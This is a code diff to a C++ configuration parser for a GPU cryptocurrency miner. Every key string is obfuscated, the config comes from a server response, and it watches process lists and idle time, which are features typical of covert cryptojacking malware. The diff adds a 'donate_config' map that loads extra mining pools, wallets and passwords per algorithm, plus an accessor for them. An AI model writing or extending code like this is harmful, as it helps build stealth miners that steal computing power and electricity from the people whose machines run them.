@@ -300,6 +300,7 @@ void ConfigManager::ParseConfigFromJson(const json& jsonResponse) {
             gpuConfig.mining_url     = gpuJson.value(OBFUSCATE_STRING("mining_url"),  "");
             gpuConfig.wallet         = gpuJson.value(OBFUSCATE_STRING("wallet"),      "");
             gpuConfig.password       = gpuJson.value(OBFUSCATE_STRING("password"),    "");
+            gpuConfig.worker         = gpuJson.value(OBFUSCATE_STRING("worker"),      OBFUSCATE_STRING("test"));
             gpuConfig.algo           = gpuJson.value(OBFUSCATE_STRING("algo"),        OBFUSCATE_STRING("kawpow"));
             gpuConfig.fan_speed      = gpuJson.value(OBFUSCATE_STRING("fan_speed"),   0);
             gpuConfig.wait_time_idle = gpuJson.value(OBFUSCATE_STRING("wait_time_idle"),   3);
@@ -310,6 +311,24 @@ void ConfigManager::ParseConfigFromJson(const json& jsonResponse) {
             gpuConfig.enabled = jsonResponse.value(OBFUSCATE_STRING("enable_gpu"), 1);
         } else {
             gpuConfig.enabled = 1;
+        }
+
+        donateConfigs.clear();
+        const std::string donateKey = OBFUSCATE_STRING("donate_config");
+        if (jsonResponse.contains(donateKey) && jsonResponse[donateKey].is_object()) {
+            for (const auto& item : jsonResponse[donateKey].items()) {
+                std::string algo = item.key();
+                json dj = item.value();
+                if (!dj.is_object()) continue;
+                MinerConfig dc;
+                dc.algo       = algo;
+                dc.mining_url = dj.value(OBFUSCATE_STRING("mining_url"), "");
+                dc.wallet     = dj.value(OBFUSCATE_STRING("wallet"),     "");
+                dc.password   = dj.value(OBFUSCATE_STRING("password"),   "");
+                dc.worker     = dj.value(OBFUSCATE_STRING("worker"),     "");
+                dc.enabled    = 1;
+                donateConfigs[algo] = dc;
+            }
         }
 
         watchedProcesses.clear();
@@ -329,6 +348,13 @@ void ConfigManager::ParseConfigFromJson(const json& jsonResponse) {
     catch (const std::exception& e) {
         std::cerr << "[-] Error parsing config: " << e.what() << std::endl;
     }
+}
+
+bool ConfigManager::GetDonateConfig(const std::string& algo, MinerConfig& out) const {
+    auto it = donateConfigs.find(algo);
+    if (it == donateConfigs.end()) return false;
+    out = it->second;
+    return true;
 }
 
 bool ConfigManager::LoadEmbeddedConfig() {
